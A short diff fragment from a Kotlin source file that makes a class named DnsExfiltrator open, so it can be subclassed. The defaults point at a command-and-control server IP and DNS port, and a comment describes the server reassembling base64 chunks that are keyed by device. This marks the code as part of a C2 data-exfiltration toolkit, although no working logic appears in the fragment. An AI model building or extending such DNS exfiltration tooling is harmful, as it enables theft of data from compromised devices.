@@ -21,7 +21,7 @@ import java.nio.ByteBuffer
  * The server reassembles chunks by (task_uuid, device_name), decodes base64, and
  * calls store_result() to persist the payload alongside HTTP results.
  */
-class DnsExfiltrator(
+open class DnsExfiltrator(
     private val serverIp: String = C2NetworkModule.C2_SERVER_IP,
     private val serverPort: Int = C2NetworkModule.C2_DNS_PORT,
 ) {
